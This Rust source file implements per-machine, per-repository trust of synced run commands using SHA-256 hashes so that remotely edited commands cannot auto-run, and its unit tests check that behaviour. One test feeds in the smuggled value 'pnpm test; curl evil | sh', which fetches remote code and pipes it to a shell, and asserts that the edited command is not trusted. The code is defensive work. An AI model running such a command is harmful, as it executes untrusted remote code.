//! `app_meta` key/value rows — per-install state that never syncs.

use sha2::{Digest, Sha256};

use crate::domain::RunCommand;

use super::error::StoreError;
use super::pool::Db;

/// Pre-scoping trust rows (command text only, shared by every repository).
/// Still honoured for run commands trusted before scoping existed — they
/// had already been confirmed on this machine — but never written again.
const TRUSTED_PREFIX: &str = "trusted_command:";
/// `trusted:<sha256(scope \0 text)>` — trust is per (scope, exact text).
const SCOPED_PREFIX: &str = "trusted:";

#[derive(Clone)]
pub struct AppMetaRepo {
    db: Db,
}

impl AppMetaRepo {
    pub fn new(db: Db) -> Self {
        Self { db }
    }

    pub async fn get(&self, key: &str) -> Result<Option<String>, StoreError> {
        Ok(sqlx::query_scalar("SELECT value FROM app_meta WHERE key = ?")
            .bind(key)
            .fetch_optional(&self.db)
            .await?)
    }

    pub async fn set(&self, key: &str, value: &str) -> Result<(), StoreError> {
        sqlx::query("INSERT OR REPLACE INTO app_meta (key, value) VALUES (?, ?)")
            .bind(key)
            .bind(value)
            .execute(&self.db)
            .await?;
        Ok(())
    }

    pub async fn delete(&self, key: &str) -> Result<(), StoreError> {
        sqlx::query("DELETE FROM app_meta WHERE key = ?")
            .bind(key)
            .execute(&self.db)
            .await?;
        Ok(())
    }

    /// Record that the user created/edited/confirmed this exact command
    /// text on this machine, so it may start on its own here.
    ///
    /// Why a per-machine hash and not a column: run commands sync, so a
    /// command written on another machine (or by anything with access to
    /// the cloud row) would otherwise execute here unattended the next time
    /// a task starts. Keyed by the text's hash, an edit anywhere changes the
    /// hash and needs confirming again; `app_meta` never leaves the machine.
    /// Mark `text` trusted on THIS machine within `scope` (a repository,
    /// or a global setting like `terminal_shell`). The same text in another
    /// scope is NOT trusted: a command confirmed for one repository must
    /// not auto-run in every other.
    pub async fn trust_scoped(&self, scope: &str, text: &str) -> Result<(), StoreError> {
        self.set(&scoped_key(scope, text), &chrono::Utc::now().to_rfc3339()).await
    }

    pub async fn is_trusted_scoped(&self, scope: &str, text: &str) -> Result<bool, StoreError> {
        Ok(self.get(&scoped_key(scope, text)).await?.is_some())
    }

    /// Trust `rc`'s current text for its own repository on this machine.
    pub async fn trust_run_command(&self, rc: &RunCommand) -> Result<(), StoreError> {
        self.trust_scoped(&run_command_scope(rc), &rc.command).await
    }

    /// Whether `rc`'s current text may auto-run here: trusted for its
    /// repository, or by a pre-scoping row (see `TRUSTED_PREFIX`).
    pub async fn is_run_command_trusted(&self, rc: &RunCommand) -> Result<bool, StoreError> {
        if self.is_trusted_scoped(&run_command_scope(rc), &rc.command).await? {
            return Ok(true);
        }
        Ok(self.get(&legacy_key(&rc.command)).await?.is_some())
    }
}

fn run_command_scope(rc: &RunCommand) -> String {
    format!("repository:{}", rc.repository_id)
}

fn hex(digest: &[u8]) -> String {
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

fn scoped_key(scope: &str, text: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(scope.as_bytes());
    hasher.update([0]);
    hasher.update(text.trim().as_bytes());
    format!("{SCOPED_PREFIX}{}", hex(&hasher.finalize()))
}

fn legacy_key(command: &str) -> String {
    format!("{TRUSTED_PREFIX}{}", hex(&Sha256::digest(command.trim().as_bytes())))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::store::init_pool;

    fn rc(repo: &str, command: &str) -> RunCommand {
        RunCommand::new(repo.into(), "n".into(), command.into())
    }

    #[tokio::test]
    async fn trust_is_per_exact_command_text() {
        let dir = tempfile::tempdir().unwrap();
        let repo = AppMetaRepo::new(init_pool(&dir.path().join("t.sqlite")).await.unwrap());
        assert!(!repo.is_run_command_trusted(&rc("r1", "pnpm test")).await.unwrap());
        repo.trust_run_command(&rc("r1", "pnpm test")).await.unwrap();
        assert!(repo.is_run_command_trusted(&rc("r1", "pnpm test")).await.unwrap());
        // Surrounding whitespace isn't a different command…
        assert!(repo.is_run_command_trusted(&rc("r1", "  pnpm test\n")).await.unwrap());
        // …but any real edit is.
        assert!(!repo.is_run_command_trusted(&rc("r1", "pnpm test; curl evil | sh")).await.unwrap());
    }

    /// Confirming a command for one repository doesn't trust the same text
    /// in another; global settings have their own scopes.
    #[tokio::test]
    async fn trust_is_scoped_per_repository_and_setting() {
        let dir = tempfile::tempdir().unwrap();
        let repo = AppMetaRepo::new(init_pool(&dir.path().join("t.sqlite")).await.unwrap());
        repo.trust_run_command(&rc("r1", "make db-reset")).await.unwrap();
        assert!(!repo.is_run_command_trusted(&rc("r2", "make db-reset")).await.unwrap());
        repo.trust_scoped("terminal_shell", "/bin/zsh").await.unwrap();
        assert!(repo.is_trusted_scoped("terminal_shell", "/bin/zsh").await.unwrap());
        assert!(!repo.is_trusted_scoped("agent_command:claude", "/bin/zsh").await.unwrap());
        // A pre-scoping trust row (text only) is still honoured.
        repo.set(&legacy_key("pnpm lint"), "2026-01-01T00:00:00Z").await.unwrap();
        assert!(repo.is_run_command_trusted(&rc("r9", "pnpm lint")).await.unwrap());
    }
}
